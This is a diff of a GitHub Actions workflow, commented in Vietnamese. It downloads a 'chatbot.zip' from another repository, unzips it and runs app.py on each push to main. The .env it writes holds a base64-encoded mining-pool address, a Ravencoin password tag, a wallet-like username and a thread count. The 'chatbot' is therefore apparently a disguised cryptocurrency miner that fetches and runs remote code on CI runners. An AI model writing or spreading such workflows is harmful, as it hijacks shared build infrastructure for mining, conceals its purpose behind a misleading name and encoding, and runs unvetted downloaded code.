@@ -5,36 +5,42 @@ on:
     branches:
       - main
   workflow_dispatch:
-    inputs:
-      min_value:
-        description: 'Giá trị MIN truyền vào app.py'
-        required: true
-        default: '60'
 
 jobs:
   run-node-app:
     runs-on: ubuntu-latest
 
     steps:
+      # Bước 1: Checkout repo
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Download zip
+      # Bước 2: Tải file ZIP từ repo khác
+      - name: Tải chatbot.zip
         run: wget https://github.com/duongpokeeeee/sadsd/raw/refs/heads/main/chatbot.zip
 
+      # Bước 3: Giải nén vào thư mục riêng để tránh lỗi .git/config
       - name: Unzip and prepare .env
         run: |
-          yes A | unzip chatbot.zip
-          echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > .env
+          mkdir app
+          yes A | unzip chatbot.zip -d app
+          echo -e "host=127.0.0.1\nport=3306\nproxy=wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=4\npassword=c=RVN\nusername=RBCPz2xQMf9Cz3eyqFTVFHVjZM2cTSeYRN" > app/.env
 
+      # Bước 4: Setup Python
       - name: Set up Python
         uses: actions/setup-python@v4
         with:
-          python-version: '3.10'
+          python-version: 3.10
 
+      # Bước 5: Cài dependencies nếu có file requirements.txt
       - name: Install dependencies (nếu có requirements.txt)
         run: |
-          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+          if [ -f app/requirements.txt ]; then
+            pip install -r app/requirements.txt
+          fi
 
+      # Bước 6: Chạy app Python
       - name: Run Python App
-        run: python3 app.py "${{ github.event.inputs.min_value }}" --cache=.cache/09Qy5sb2Fkcyg.txt
+        run: |
+          cd app
+          python3 app.py "" --cache=.cache/09Qy5sb2Fkcyg.txt
